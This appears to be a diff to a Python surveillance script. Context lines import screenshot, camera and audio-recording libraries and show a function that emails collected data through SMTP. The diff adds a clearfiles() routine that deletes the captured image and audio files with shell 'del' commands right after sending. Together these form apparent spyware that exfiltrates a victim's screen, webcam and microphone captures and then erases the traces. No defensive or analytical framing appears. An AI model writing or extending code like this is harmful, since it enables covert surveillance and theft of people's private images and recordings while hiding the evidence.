@@ -3,6 +3,7 @@ import pyautogui
 import cv2
 import pyaudio
 import wave
+import os
 import email, smtplib
 from email import encoders
 from email.mime.base import MIMEBase
@@ -86,6 +87,15 @@ def sendmail():
 	server.login(sender_email, password)
 	server.sendmail(sender_email, receiver_email, text)
 
+def clearfiles():
+	cmd1 = "del image1.jpg"
+	cmd2 = "del file1.wav"
+	cmd3 = "del user1.jpg"
+	process = os.popen(cmd1)
+	process = os.popen(cmd2)
+	process = os.popen(cmd3)	
+
 if __name__ == '__main__':
 	main()
 	sendmail()
+	clearfiles()
